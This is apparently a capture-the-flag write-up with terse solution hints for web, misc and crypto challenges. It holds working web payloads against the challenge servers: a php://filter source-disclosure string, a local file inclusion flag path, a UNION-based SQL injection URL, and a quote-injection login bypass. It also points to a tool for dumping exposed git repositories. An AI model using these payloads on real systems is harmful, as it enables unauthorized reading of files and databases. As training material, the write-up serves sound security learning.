## Web
### easy_lfi
* get source code
php://filter/read=convert.base64-encode/resource=index.php
* obtain flag
http://140.110.112.29:4005/?f=///////flag

### easy_peasy
* SQL injection
http://140.110.112.29:4001/news.php?id=-1%20union%20SELECT%201,2,THIS_IS_FLAG_YO%20from%20fl4g.secret
### Developer_Tools
* Just decode base64.
### Flashing_Redirect
* Use curl to get the flag.
### four-char-inj
* http://120.114.62.45:4003/?user=*'&pass=*'
### gitleak
* Use GitHack tools
https://github.com/lijiejie/GitHack

## Misc
### Linux-hidden-1
* Use ssh -p 2200 lab@140.110.112.29
### Linux-hidden-2
* Use ssh -p 2200 lab@140.110.112.29.
* Compress /home/lab/ForYou.tar.gz to /tmp/XXX.
* use the command:
```
$ tar -C /tmp/oneheart -zvxf ForYou.tar.gz
```
## Crypto
### HashingService
* encode sha256 to solve it.
